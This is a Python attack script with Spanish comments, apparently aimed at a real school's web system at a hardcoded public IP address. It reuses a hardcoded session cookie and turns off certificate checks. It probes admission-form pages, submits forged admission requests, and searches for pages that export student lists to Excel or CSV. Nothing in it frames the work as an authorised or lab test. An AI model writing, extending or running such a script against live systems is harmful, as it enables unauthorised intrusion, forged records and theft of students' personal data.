import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class BusinessLogicExploiter:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False
        # Usar la sesión activa
        self.session.cookies.set('JSESSIONID', 'E79C9B62048BB93857B87CF6FAA56B6B')

    def exploit_admission_process(self):
        """Explota el proceso de admisión encontrado"""
        print("[*] Explotando proceso de admisión...")
        
        # Basado en "Solicita Ficha de Admisión"
        admission_urls = [
            "/jsp/escolar/proceso_admision/solicitar_ficha.jsp",
            "/jsp/escolar/generar_ficha.jsp",
            "/jsp/escolar/ficha_admision.jsp",
            "/jsp/escolar/proceso_admision/generar_ficha.jsp"
        ]
        
        for url in admission_urls:
            try:
                full_url = f"{self.base_url}{url}"
                response = self.session.get(full_url, timeout=8)
                
                if response.status_code == 200:
                    print(f"[!] ¡Página de ficha encontrada: {url}")
                    
                    # Probar generar una ficha
                    if 'form' in response.text.lower():
                        print(f"    [+] Tiene formulario - intentando enviar datos...")
                        self.test_ficha_generation(full_url)
                        
            except Exception as e:
                print(f"[-] Error en {url}: {e}")

    def test_ficha_generation(self, url):
        """Prueba generar una ficha de admisión"""
        try:
            # Datos de prueba para generar ficha
            ficha_data = {
                'yAccion': 'generar_ficha',
                'yInteresado': '1',
                'xNombre': 'TEST',
                'xApPaterno': 'USER',
                'xApMaterno': 'SQLINJECTION',
                'xCurp': 'TEST123456TEST123',
                'xModalidad': 'N'
            }
            
            response = self.session.post(url, data=ficha_data, timeout=10)
            
            if response.status_code == 200:
                print(f"    [+] Solicitud de ficha enviada - Status: {response.status_code}")
                
                # Buscar número de ficha o referencia
                if 'ficha' in response.text.lower() or 'folio' in response.text.lower():
                    print("    [!] Posible ficha generada - revisar respuesta")
                    
                # Guardar respuesta
                with open('ficha_generation_response.html', 'w', encoding='utf-8') as f:
                    f.write(response.text)
                print("    [+] Respuesta guardada en ficha_generation_response.html")
                
        except Exception as e:
            print(f"    [-] Error generando ficha: {e}")

    def find_data_exports(self):
        """Busca funcionalidades de exportación de datos"""
        print("\n[*] Buscando exportación de datos...")
        
        export_urls = [
            "/jsp/escolar/exportar_excel.jsp",
            "/jsp/escolar/generar_reporte.jsp",
            "/jsp/admin/exportar_datos.jsp",
            "/jsp/reportes/generar.jsp",
            "/jsp/exportar/lista_alumnos.jsp"
        ]
        
        for url in export_urls:
            try:
                full_url = f"{self.base_url}{url}"
                response = self.session.get(full_url, timeout=5)
                
                if response.status_code == 200:
                    print(f"[!] ¡Página de exportación encontrada: {url}")
                    
                    # Verificar si permite descargar datos
                    if 'excel' in response.text.lower() or 'csv' in response.text.lower():
                        print(f"    [+] Soporta exportación a Excel/CSV")
                        
            except Exception as e:
                print(f"[-] Error en {url}: {e}")

# Ejecutar explotación de lógica de negocio
print("=== EXPLOTACIÓN DE LÓGICA DE NEGOCIO ===")
logic_exploiter = BusinessLogicExploiter("189.254.143.102")
logic_exploiter.exploit_admission_process()
logic_exploiter.find_data_exports()